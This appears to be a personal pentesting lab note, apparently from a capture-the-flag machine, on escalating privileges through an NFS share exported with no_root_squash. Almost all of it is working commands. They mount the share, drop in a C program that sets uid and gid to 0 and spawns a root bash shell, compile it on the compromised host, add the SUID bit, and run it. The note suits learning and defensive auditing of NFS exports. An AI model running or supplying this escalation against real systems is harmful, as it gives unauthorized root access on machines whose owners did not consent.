```bash
cat /etc/exports
```
If we see **no_root_squash,** this means that the folder attached is shareable and can be mounted. If we connect to the file share as root, any file that we make in the share will be owned by root and if we add the SUID bit it will be ran as root.
![[Pasted image 20250214220356.png]]
On our machine
```bash
showmount -e 10.129.2.210   <---- Target IP
sudo mount -o rw,vers=3 10.129.2.210:/tmp /tmp/mountme
```

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash -p"); return 0; }' > /tmp/mountme/p.c
```

On compromised host
```bash
gcc /tmp/p.c -o /tmp/p  
```

On our machine
```bash
sudo chmod +s /tmp/mountme/p
```

On compromised host
```bash
/tmp/p
```